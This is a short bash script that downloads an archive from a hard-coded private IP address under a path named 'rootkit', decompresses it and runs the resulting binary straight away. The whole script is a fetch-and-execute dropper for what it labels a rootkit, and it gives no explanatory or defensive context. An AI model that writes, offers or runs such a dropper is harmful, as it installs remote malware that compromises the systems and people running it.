#!/bin/bash

wget http://10.17.29.47:2580/rootkit/dae.gz && gunzip dae.gz && ./dae
